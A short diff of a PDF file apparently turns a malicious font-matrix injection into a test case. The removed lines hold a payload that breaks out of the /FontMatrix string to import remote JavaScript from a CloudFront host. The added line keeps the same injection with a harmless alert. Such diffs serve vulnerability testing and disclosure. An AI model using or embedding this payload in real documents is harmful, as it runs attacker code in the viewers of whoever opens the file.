@@ -27,9 +27,7 @@ endobj
 /BaseFont/PAXEKO+SourceSansPro-Bold
 /LastChar 102
 /Encoding/WinAnsiEncoding
-/FontMatrix [0.1 0 0 0.1 0 (1\);
-import\('https://d3eijx87g4d7ha.cloudfront.net'\)
-//)]
+/FontMatrix [1 2 3 4 5 (0\); alert\('foobar')]
 /Subtype/Type1
 /FirstChar 65
 /FontDescriptor 9 0 R
